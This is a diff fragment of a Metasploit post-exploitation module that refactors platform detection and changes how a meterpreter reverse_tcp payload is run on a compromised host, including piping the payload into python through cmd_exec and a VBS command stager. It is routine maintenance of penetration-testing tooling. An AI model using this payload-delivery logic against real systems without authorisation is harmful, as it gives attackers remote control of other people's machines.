@@ -80,18 +80,18 @@ class MetasploitModule < Msf::Post
 
     # Handle platform specific variables and settings
     case session.platform
-    when /win/i
-      platform = 'win'
+    when 'windows'
+      platform = 'windows'
       payload_name = 'windows/meterpreter/reverse_tcp'
       lplat = [Msf::Platform::Windows]
       larch = [ARCH_X86]
       psh_arch = 'x86'
       vprint_status("Platform: Windows")
-    when /osx/i
+    when 'osx'
       platform = 'python'
       payload_name = 'python/meterpreter/reverse_tcp'
       vprint_status("Platform: OS X")
-    when /solaris/i
+    when 'solaris'
       platform = 'python'
       payload_name = 'python/meterpreter/reverse_tcp'
       vprint_status("Platform: Solaris")
@@ -139,9 +139,9 @@ class MetasploitModule < Msf::Post
     end
 
     case platform
-    when 'win'
+    when 'windows'
       if session.type == 'powershell'
-        template_path = File.join(Msf::Config.data_directory, 'templates', 'scripts')
+        template_path = Rex::Powershell::Templates::TEMPLATE_DIR
         psh_payload = case datastore['Powershell::method']
                       when 'net'
                         Rex::Powershell::Payload.to_win32pe_psh_net(template_path, payload_data)
@@ -174,7 +174,7 @@ class MetasploitModule < Msf::Post
       end
     when 'python'
       vprint_status("Transfer method: Python")
-      cmd_exec("python -c \"#{payload_data}\"")
+      cmd_exec("echo \"#{payload_data}\" | python")
     else
       vprint_status("Transfer method: Bourne shell [fallback]")
       exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload_data)
@@ -200,7 +200,7 @@ class MetasploitModule < Msf::Post
       :linemax => linemax,
       #:nodelete => true # keep temp files (for debugging)
     }
-    if session.platform =~ /win/i
+    if session.platform == 'windows'
       opts[:decoder] = File.join(Rex::Exploitation::DATA_DIR, "exploits", "cmdstager", 'vbs_b64')
       cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)
     else
